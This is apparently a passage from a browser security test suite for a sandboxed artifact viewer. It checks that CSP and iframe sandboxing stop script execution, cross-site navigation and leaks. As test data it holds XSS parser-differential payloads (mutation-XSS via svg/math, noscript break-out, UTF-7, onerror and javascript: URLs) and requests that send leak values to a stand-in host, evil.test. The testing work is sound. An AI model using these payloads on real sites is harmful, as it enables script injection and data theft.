    const g2 = grantFor("page", { "index.html": html(CHANNEL_PROBES_HTML(E2, "sw.js")), "sw.js": { body: "self.addEventListener('fetch', () => {});", contentType: "text/javascript" } });
    await harness(t, g2);
    const res = await waitFor(() => t.evalIn(`(__r.raw.find(m => m && m.t === "probe-result") || {}).r`), 15000);
    assert.ok(res, "probe page reported");
    console.log(`[artifact-isolation] sealed-frame probes: ${JSON.stringify(res)}`);
    if (CONTROL?.dataImg === "loaded") assert.notEqual(res.dataImg, "loaded", "data: images refused (img-src is the token path)");
    if (CONTROL?.blobImg === "loaded") assert.notEqual(res.blobImg, "loaded", "blob: images refused");
    if (CONTROL?.sw === "registered") assert.notEqual(res.sw, "registered", "no service worker from an opaque origin");
    if (CONTROL?.preconnect) assert.equal(evil2Connections, conns, "no connection from dns-prefetch / preconnect");
    else console.log("[artifact-isolation] preconnect/dns-prefetch: UNTESTABLE on this Chrome (the unprotected control opened no connection either)");
  } finally { await t.close(); }
});

test("D20: a tainted page minted scripts-off runs no script at all, though its type is scripted", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const E = `http://evil.test:${P}`;
    const before = evil.length;
    const g = grantFor("page", { "index.html": html(`<!doctype html><html><head></head><body>shaped by a contact<script>parent.postMessage({t:"probe-result",r:{ran:true}},"*"); location.href="${E}/selfnav-tainted";</script></body></html>`) }, { scriptsOff: true });
    assert.equal(g.sandbox, "");
    await harness(t, g);
    await waitFor(() => t.evalIn("__r.ready"));
    await sleep(800);
    assert.equal(await t.evalIn(`__r.raw.some(m => m && m.t === "probe-result")`), false);
    assert.deepEqual(evil.slice(before), [], "no self-navigation without script");
    assert.equal((await t.evalIn("__v.state()")).tripped, false);
  } finally { await t.close(); }
});


// Parser-differential suite (security review): the origin rewrites NO markup
// for safety, so the browser's own parse is the only parse that matters. Each
// tricky document carries attempts to run script and to fetch evil.test.
function trickyDocs(E) {
  const POST = (n) => `window.__ran=1,parent.postMessage({t:"probe-result",r:{m:${n}}},"*")`;
  return [
    ["unclosed comment", `<!-- unclosed --><script>${POST(1)}</script><!-- unclosed <script>${POST(1)}</script><img src="${E}/d1">`],
    ["<!-- inside script", `<script><!--</script><script>${POST(2)}</script><img src="${E}/d2">`],
    ["CDATA in HTML", `<![CDATA[<script>${POST(3)}</script>]]><img src="${E}/d3">`],
    ["noscript attribute break-out", `<noscript><p title="</noscript><img src=${E}/d4 onerror=${POST(4)}>"></noscript>`],
    ["template", `<template><script>${POST(5)}</script><img src="${E}/d5"></template><img src="${E}/d5b">`],
    ["raw-text elements", `<textarea><script>${POST(6)}</script></textarea><title><img src="${E}/d6"></title><xmp><img src="${E}/d6b"></xmp><img src="${E}/d6c"><script>${POST(6)}</script>`],
    ["malformed attributes", `<p a="b'c><script>${POST(7)}</script><img src=${E}/d7 x="><img src="${E}/d7b"><script>${POST(7)}</script>`],
    ["BOM + doctype", `﻿<!doctype html><script>${POST(8)}</script><img src="${E}/d8">`],
    ["nested forms", `<form action="${E}/d9" method=get><form action="${E}/d9b"><input name=q value=1></form></form><script>${POST(9)};document.forms[0].submit()</script>`],
    ["svg foreign content", `<svg><style><img src=${E}/d10 onerror=${POST(10)}></style><foreignObject><img src="${E}/d10b"></foreignObject></svg>`],
    ["math mglyph", `<math><mtext><table><mglyph><style><img src=${E}/d11 onerror=${POST(11)}></style></mglyph></table></mtext></math><img src="${E}/d11b"><script>${POST(11)}</script>`],
    ["unclosed doctype", `<!doctype html <script>${POST(12)}</script><img src="${E}/d12">`],
    ["plaintext (rest of the document is text by design)", `<script>${POST(13)}</script><img src="${E}/d13a"><plaintext><script>${POST(13)}</script><img src="${E}/d13">`],
    ["utf-7 meta", `<meta charset="utf-7">+ADw-script+AD4-${POST(14)}+ADw-/script+AD4-<img src="${E}/d14">`],
  ];
}

test("parser differentials, scripts-off (D20): whatever the markup, no script runs and nothing reaches evil.test — counted only where an UNPROTECTED control shows the document is live", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const E = `http://evil.test:${P}`;
    // Positive control per document: the same markup top-level on ctl.test with
    // no CSP and no sandbox. Live = a script ran or a request left.
    const live = [];
    for (const [i, [label, doc]] of trickyDocs(E).entries()) {
      const before = evil.length;
      CTL_DOCS[i] = doc;
      await t.nav(`http://ctl.test:${P}/doc?i=${i}`);
      await sleep(400);
      const ran = await t.evalIn("window.__ran === 1");
      if (ran === true || evil.length > before) live.push(label);
      else console.log(`[artifact-isolation] differential document not live even unprotected (logged, not counted): ${label}`);
    }
    assert.ok(live.length >= 12, `most documents are live probes (${live.length}/14: ${live.join(", ")})`);
    for (const [label, doc] of trickyDocs(E)) {
      if (!live.includes(label)) continue;
      const before = evil.length;
      const g = grantFor("page", { "index.html": html(doc) }, { scriptsOff: true });
      await harness(t, g);
      await waitFor(() => t.evalIn("__r.ready"));
      await sleep(400);
      assert.equal(await t.evalIn(`__r.raw.some(m => m && m.t === "probe-result")`), false, `${label}: no script ran`);
      assert.deepEqual(evil.slice(before).map((e) => e.path), [], `${label}: nothing reached evil.test`);
      assert.equal((await t.evalIn("__v.state()")).tripped, false, `${label}: no navigation`);
    }
  } finally { await t.close(); }
});

test("parser differentials, scripted: the helper's hello arrives for every tricky document (placement is parse-free), and nothing reaches evil.test", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const E = `http://evil.test:${P}`;
    for (const [label, doc] of trickyDocs(E)) {
      const before = evil.length;
      const g = grantFor("page", { "index.html": html(doc) });
      await harness(t, g);
      const ok = await waitFor(() => t.evalIn("__v.state().hello || __v.state().tripped"), 8000);
      const st = await t.evalIn("__v.state()");
      assert.ok(ok, `${label}: settled`);
      assert.equal(st.hello && !st.tripped, true, `${label}: hello received, not tripped (${JSON.stringify(st)})`);
      await sleep(300);
      assert.deepEqual(evil.slice(before).map((e) => e.path), [], `${label}: CSP held`);
    }
  } finally { await t.close(); }
});

// Re-check 2 §1.3: the viewer page's narrowed frame-src blocks every navigation
// of the artifact frame to another site BEFORE the request is sent — a user
// click in a scripts-off page, or a script navigation (200, 204, a hang).
// Each case runs twice: "narrow" (the real viewerCsp) must send NOTHING to
// evil.test; "open" (the old permissive shape) is the positive control that
// proves the channel exists without the fix.
function navCases(E) {
  const box = "body{margin:0}a,svg,img{display:block}a{width:300px;height:50px}";
  return [
    ["scripts-off <a> click", "page", true, `<style>${box}</style><a href="${E}/n-a?leak=OWNER-PRIVATE">see the chart</a>`],
    ["scripts-off <area> click", "page", true, `<style>${box}</style><img usemap="#m" width=300 height=50 src="data:,"><map name=m><area shape=rect coords="0,0,300,50" href="${E}/n-area?leak=1"></map>`],
    ["scripts-off <svg><a> click", "page", true, `<style>${box}</style><svg width=300 height=50><a href="${E}/n-svg?leak=1"><rect width=300 height=50 fill=red /></a></svg>`],
    ["scripts-off <a download> click", "page", true, `<style>${box}</style><a download href="${E}/n-dl?leak=1">download</a>`],
    ["scripted location.href (200)", "page", false, `<script>setTimeout(() => { location.href = "${E}/n-200?leak=1"; }, 300)</script>`],
    ["scripted navigation answered 204", "page", false, `<script>setTimeout(() => { location.href = "${E}/nav204?leak=1"; }, 300)</script>`],
    ["scripted navigation that never finishes", "page", false, `<script>setTimeout(() => { location.href = "${E}/hang-silent?leak=1"; }, 300)</script>`],
  ];
}

for (const mode of ["narrow", "open"]) {
  test(`navigation (${mode === "narrow" ? "the real viewer CSP: nothing leaves" : "POSITIVE CONTROL, permissive frame-src: the channel exists"}): link clicks and script navigations`, async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
    const t = await tab();
    try {
      const E = `http://evil.test:${P}`;
      for (const [label, type, scriptsOff, body] of navCases(E)) {
        const before = evil.length;
        const g = grantFor(type, { "index.html": html(`<!doctype html><html><head></head><body>${body}</body></html>`) }, { scriptsOff });
        await harness(t, g, { mode });
        await waitFor(() => t.evalIn("__r.ready"));
        await sleep(300);
        if (scriptsOff) for (const ty of ["mousePressed", "mouseReleased"]) await t.send("Input.dispatchMouseEvent", { type: ty, x: 20, y: 20, button: "left", clickCount: 1 });
        await sleep(1200);
        const hits = evil.slice(before).map((e) => e.path);
        if (process.env.NAVDEBUG) console.log("NAVDEBUG", mode, label, JSON.stringify(hits), JSON.stringify(await t.evalIn("__v.state()")), JSON.stringify(await t.evalIn("__r")));
        if (mode === "narrow") {
          assert.deepEqual(hits, [], `${label}: blocked before the request is sent`);
          const st = await t.evalIn("__v.state()");
          assert.equal(st.tripped, true, `${label}: the blocked navigation still loads an error page, so the tripwire tears the frame down`);
        } else {
          assert.ok(hits.length >= 1, `${label}: positive control — with the permissive frame-src the request reaches evil.test`);
        }
      }
    } finally { await t.close(); }
  });
}

test("the narrowed CSP keeps legitimate pages working: the helper's hello arrives and nothing trips", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    await harness(t, grantFor("page", { "index.html": html("<!doctype html><p>hi</p>") }));
    assert.ok(await waitFor(() => t.evalIn("__v.state().hello")));
    await sleep(300);
    assert.equal((await t.evalIn("__v.state()")).tripped, false);
  } finally { await t.close(); }
});

test("CSP canary: under another page's policy (a Turbo body swap) the viewer refuses — nothing is minted or framed", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", { "index.html": html("<!doctype html><p>hi</p>") });
    await harness(t, g, { mode: "global" });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.refused")).length), "refused");
    assert.deepEqual(await t.evalIn("__r.refused"), ["csp-not-in-force"]);
    assert.equal(await t.evalIn("__r.minted"), 0, "no view token was minted");
    assert.equal(await t.evalIn("document.querySelectorAll('iframe.crow-artifact-frame').length"), 0);
  } finally { await t.close(); }
});

test("R3-L8: a scripts-off version loaded TOP-LEVEL (no frame, no iframe sandbox) runs no script — the header alone", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const E = `http://evil.test:${P}`;
    for (const [label, doc] of trickyDocs(E)) {
      const before = evil.length;
      const g = grantFor("page", { "index.html": html(doc) }, { scriptsOff: true });
      await t.nav(g.url);
      await sleep(300);
      const ran = await t.evalIn("window.__ran === 1");
      assert.equal(ran, false, `${label}: no script ran at top level`);
      assert.deepEqual(evil.slice(before).map((e) => e.path), [], `${label}: nothing reached evil.test`);
    }
  } finally { await t.close(); }
});

// ── D24 (spec v1.6): "couldn't load — retry" vs the no-hello flag ──────────
const PAGE = () => ({ "index.html": html("<!doctype html><html><body><p>ok</p></body></html>") });
const D24 = { evidence: "server", helloMs: 900, loadMs: 1500 };

test("D24: a parsed page whose hello never arrives is FLAGGED — the helper was served, so content cannot buy a retry", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", PAGE());
    await harness(t, g, { mount: D24, before: "window.__dropHello = true" });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.trips")).length), "tripped");
    assert.deepEqual(await t.evalIn("__r.trips"), ["no-hello"]);
    assert.deepEqual(await t.evalIn("__r.retries"), []);
    assert.equal(evidenceAsks.at(-1), g.tokenId, "asked by tokenId, never the secret");
    assert.equal(tokens.evidence(g.tokenId).helperServed, true);
    assert.equal(await t.evalIn("document.querySelectorAll('iframe').length"), 0);
  } finally { await t.close(); }
});

test("D24: a non-HTML scripted document (no helper to say hello) is still FLAGGED", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", { "index.html": { body: "<p>plain</p>", contentType: "text/plain" } });
    await harness(t, g, { mount: D24 });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.trips")).length));
    assert.deepEqual(await t.evalIn("__r.trips"), ["no-hello"]);
  } finally { await t.close(); }
});

test("D24: connection refused before the document → retry, no flag; the frame is torn down", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", PAGE(), { originBase: `http://art.test:${P5}` });
    await harness(t, g, { mount: D24 });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.retries")).length), "retry offered");
    assert.deepEqual(await t.evalIn("__r.retries"), ["not-served"]);
    assert.deepEqual(await t.evalIn("__r.trips"), []);
    assert.deepEqual(await t.evalIn("__v.state()"), { loads: 1, hello: false, tripped: false, pending: false, framed: false });
  } finally { await t.close(); }
});

test("D24: document served but cut off after the doctype (helper never requested; the frame never fires load) → retry", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", PAGE(), { originBase: `http://art.test:${P4}` });
    await harness(t, g, { mount: D24 });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.retries")).length), "retry offered");
    assert.deepEqual(await t.evalIn("__r.retries"), ["not-parsed"]);
    assert.deepEqual(await t.evalIn("__r.trips"), []);
    assert.equal(await t.evalIn("__v.state().loads"), 0, "the load timeout, not a load event, ended it");
    const ev = tokens.evidence(g.tokenId);
    assert.equal(ev.docServed && ev.helperInjected && !ev.helperServed, true);
  } finally { await t.close(); }
});

test("D24: the gateway no longer knows the token (restart/revoke) → retry; the route failing → retry", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", PAGE(), { originBase: `http://art.test:${P5}` });
    tokens.revokeToken(g.tokenId);
    await harness(t, g, { mount: D24 });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.retries")).length));
    assert.deepEqual(await t.evalIn("__r.retries"), ["unknown"]);
    const g2 = grantFor("page", PAGE(), { originBase: `http://art.test:${P5}` });
    await harness(t, g2, { mount: { ...D24, evidence: "500" } });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.retries")).length));
    assert.deepEqual(await t.evalIn("__r.retries"), ["unreachable"]);
    assert.deepEqual(await t.evalIn("__r.trips"), []);
  } finally { await t.close(); }
});

test("D24: while the answer is pending, load/reload/showBlock refuse; a retry passes the old tokenId as `replaces`", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", PAGE(), { originBase: `http://art.test:${P5}` });
    // A slow evidence route: the answer is held until the page releases it.
    await harness(t, g, { mount: D24, before: `window.__hold = new Promise((r) => { window.__release = r; }); const of = window.fetch; window.fetch = (u, o) => String(u).startsWith("/evidence") ? window.__hold.then(() => of(u, o)) : of(u, o);` });
    assert.ok(await waitFor(async () => (await t.evalIn("__v.state().pending"))), "pending after the timeout");
    assert.equal(await t.evalIn("document.querySelectorAll('iframe').length"), 0, "torn down before the answer");
    assert.equal(await t.evalIn("__v.reload().then(() => 'ok', (e) => e.message)"), "pending");
    assert.equal(await t.evalIn("__v.load().then(() => 'ok', (e) => e.message)"), "pending");
    assert.equal(await t.evalIn("__v.showBlock('b1').then(() => 'ok', (e) => e.message)"), "pending");
    await t.evalIn("__release()");
    assert.ok(await waitFor(async () => (await t.evalIn("__r.retries")).length));
    assert.equal(await t.evalIn("__v.state().pending"), false);
    await t.evalIn("__v.reload()");
    assert.deepEqual(await t.evalIn("__r.mintArgs"), [{ replaces: null }, { replaces: g.tokenId }]);
  } finally { await t.close(); }
});

test("D24: a mount without loadEvidence keeps the pre-D24 behaviour (no hello → flag)", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("page", PAGE(), { originBase: `http://art.test:${P5}` });
    await harness(t, g, { mount: { evidence: "none", helloMs: 900 } });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.trips")).length));
    assert.deepEqual(await t.evalIn("__r.trips"), ["no-hello"]);
  } finally { await t.close(); }
});

// ── pins (plan PR-2 Task 2.2): the only new parent→frame message ──────────
test("pins: only owner element/text anchor fields go in; rects come back validated and clamped; a scroll storm never trips the flood guard", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const tall = `<!doctype html><html><head><style>body{margin:0}#a{position:absolute;left:30px;top:40px;width:100px;height:20px;margin:0}#far{position:absolute;left:30px;top:3000px}</style></head><body><p id=a>alpha words</p><p id=far>far away</p></body></html>`;
    const g = grantFor("page", { "index.html": html(tall) });
    await harness(t, g, { mount: { evidence: "none" } });
    assert.ok(await waitFor(async () => (await t.evalIn("__r.ready")) === 1), "hello");
    // pinOut: what may cross INTO the frame.
    const out = await t.evalIn(`JSON.stringify([
      CrowArtifactViewer.pinOut({ i: 1, anchor: { kind: "element", selector: "#a", text: "alpha words" } }),
      CrowArtifactViewer.pinOut({ i: 2, anchor: { kind: "text", quote: "far away", prefix: "p", suffix: "s" } }),
      CrowArtifactViewer.pinOut({ i: 3, anchor: { kind: "block", id: "b1", text: "t", quote: "typed words" } }),
      CrowArtifactViewer.pinOut({ i: 4, anchor: { kind: "region", x: 0.5, y: 0.5 } }),
      CrowArtifactViewer.pinOut({ i: 0, anchor: { kind: "element", selector: "#a", text: "" } }),
      CrowArtifactViewer.pinOut({ i: 1.5, anchor: { kind: "element", selector: "#a", text: "" } })
    ])`);
    assert.deepEqual(JSON.parse(out), [
      { i: 1, anchor: { kind: "element", selector: "#a" } },
      { i: 2, anchor: { kind: "text", quote: "far away", prefix: "p", suffix: "s" } },
      { i: 3, anchor: { kind: "block", id: "b1" } },
      null, null, null,
    ], "element text, block quotes (D28: a block crosses as its id only), regions and bad numbers never cross");
    // validRects: clamped to the frame box, off-screen dropped, junk refused.
    const vr = await t.evalIn(`JSON.stringify([
      CrowArtifactViewer.validRects([{ i: 1, x: -5, y: 10, w: 20, h: 900 }, { i: 2, x: 900, y: 10, w: 5, h: 5 }], 800, 600),
      CrowArtifactViewer.validRects([{ i: 1, x: "1", y: 1, w: 1, h: 1 }], 800, 600),
      CrowArtifactViewer.validRects(new Array(101).fill({ i: 1, x: 1, y: 1, w: 1, h: 1 }), 800, 600),
      CrowArtifactViewer.validRects([{ i: 1, x: Infinity, y: 1, w: 1, h: 1 }], 800, 600)
    ])`);
    assert.deepEqual(JSON.parse(vr), [[{ i: 1, x: 0, y: 10, w: 20, h: 590 }], null, null, null]);
    // The helper round trip: posted pins → rects for the visible one only.
    await t.evalIn(`__v.setPins([{ i: 1, anchor: { kind: "element", selector: "#a", text: "alpha words" } }, { i: 2, anchor: { kind: "text", quote: "far away", prefix: "", suffix: "" } }])`);
    assert.ok(await waitFor(async () => (await t.evalIn("__r.rects.length")) >= 1), "rects came back");
    const last = JSON.parse(await t.evalIn("JSON.stringify(__r.rects.at(-1))"));
    assert.deepEqual(last.map((r) => r.i), [1], "the far (off-screen) anchor is dropped");
    assert.ok(Math.abs(last[0].x - 30) <= 1 && Math.abs(last[0].y - 40) <= 1, JSON.stringify(last));
    // A scroll storm inside the frame: the helper throttles to <=4/s, so the
    // viewer's flood guard (20/s) never trips.
    await t.evalIn(`(() => { const f = document.querySelector("iframe"); const r = f.getBoundingClientRect(); window.__fr = { x: r.x + 100, y: r.y + 100 }; })()`);
    const fr = JSON.parse(await t.evalIn("JSON.stringify(__fr)"));
    for (let k = 0; k < 40; k++) await t.send("Input.dispatchMouseEvent", { type: "mouseWheel", x: fr.x, y: fr.y, deltaX: 0, deltaY: 60 });
    await sleep(1500);
    assert.deepEqual(await t.evalIn("__r.trips"), [], "no flood trip");
    assert.ok((await t.evalIn("__r.rects.length")) >= 2, "rects followed the scroll");
  } finally { await t.close(); }
});

test("D28: a document is HELPER-ONLY — its own inline script, handlers, javascript: URLs, other script files and SVG scripts never run; the helper says hello", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const E = `http://evil.test:${P}`;
    const before = evil.length;
    // Hand-crafted, UNSANITIZED markup (the renderer would strip all of it):
    // the CSP alone must hold.
    const probe = (k) => `parent.postMessage({t:"probe-result",r:{ran:"${k}"}},"*");new Image().src="${E}/${k}"`;
    const g = grantFor("document", {
      "index.html": html(`<!doctype html><html><head></head><body><div class="blk" id="b1"><p>hello words</p></div>
<script>${probe("inline")}</script>
<img src="nope.png" onerror='${probe("onerror")}'>
<a id=js href='javascript:${probe("jsurl")}'>x</a>
<script src="other.js"></script>
<script src="__crow/Anchor-Helper.js"></script>
<svg><script>${probe("svg")}</script></svg>
<iframe srcdoc="<script>${probe("srcdoc")}</script>"></iframe>
<script type=module>${probe("module")}</script>
</body></html>`),
      "other.js": { body: probe("otherjs"), contentType: "text/javascript" },
    });
    await harness(t, g);
    assert.ok(await waitFor(async () => (await t.evalIn("__r.ready")) === 1), "the helper said hello");
    await t.evalIn(`(() => { try { document.querySelector('iframe.crow-artifact-frame').contentWindow.postMessage({}, "*"); } catch (e) {} })()`);
    await sleep(1500);
    assert.equal(await t.evalIn(`JSON.stringify(__r.raw.filter(m => m && m.t === "probe-result"))`), "[]", "no content script ran");
    assert.deepEqual(evil.slice(before).map((e) => e.path), [], "nothing reached evil.test");
    const attrs = await t.evalIn(`document.querySelector('iframe.crow-artifact-frame').getAttribute('sandbox')`);
    assert.equal(attrs, "allow-scripts");
    const st = await t.evalIn("__v.state()");
    assert.equal(st.tripped, false);
    assert.equal(st.loads, 1);
  } finally { await t.close(); }
});

test("D28 helper (review M-3): a real drag-select proposes ONCE (debounced — never a flood trip), a tap in select-only mode proposes nothing, and select-then-Comment proposes the current selection", async (ctx) => { if (!chrome) return ctx.skip("no headless Chrome");
  const t = await tab();
  try {
    const g = grantFor("document", { "index.html": html(`<!doctype html><html><head><style>body{margin:0}p{font:20px/1 monospace;margin:20px;white-space:nowrap}</style></head><body><div class="blk" id="b1"><p>alpha beta gamma delta epsilon zeta</p></div></body></html>`) });
    await harness(t, g);
    assert.ok(await waitFor(async () => (await t.evalIn("__r.ready")) === 1), "hello");
    const drag = async (x1, x2, steps = 40) => {
      await t.send("Input.dispatchMouseEvent", { type: "mousePressed", x: x1, y: 30, button: "left", clickCount: 1 });
      for (let i = 1; i <= steps; i++) await t.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x1 + ((x2 - x1) * i) / steps, y: 30, button: "left", buttons: 1 });
      await t.send("Input.dispatchMouseEvent", { type: "mouseReleased", x: x2, y: 30, button: "left", clickCount: 1 });
    };
    // Phase C: select FIRST (comment mode off → nothing), then press Comment → one proposal.
    await drag(22, 200);
    await sleep(700);
    assert.equal((await t.evalIn("__r.proposals.length")), 0, "comment mode off: no proposal");
    await t.evalIn("__v.setCommentMode(true, { selectOnly: true })");
    const c = await waitFor(async () => { const p = await t.evalIn("__r.proposals"); return p && p.length ? p : null; });
    assert.equal(c.length, 1);
    assert.equal(c[0].kind, "text");
    assert.equal(c[0].block, "b1");
    assert.match(c[0].quote, /^alpha/);
    // Phase B: a tap in select-only mode proposes nothing.
    const before = await t.evalIn("__r.proposals.length");
    for (const type of ["mousePressed", "mouseReleased"]) await t.send("Input.dispatchMouseEvent", { type, x: 100, y: 90, button: "left", clickCount: 1 });   // inside the frame, below the text
    await sleep(700);
    assert.equal(await t.evalIn("__r.proposals.length"), before, "a tap on a document proposes nothing");
    assert.equal((await t.evalIn("__v.state()")).tripped, false);
    // Phase A: a fast drag (dozens of selectionchange events) → one more proposal, no trip.
    await drag(22, 330, 60);
    await sleep(900);
    const after = await t.evalIn("__r.proposals.length");
    assert.ok(after >= 2 && after <= 3, "debounced: " + after + " proposals for one drag");
    const st = await t.evalIn("__v.state()");
    assert.equal(st.tripped, false, "an ordinary drag-select never trips the flood guard");
  } finally { await t.close(); }
});
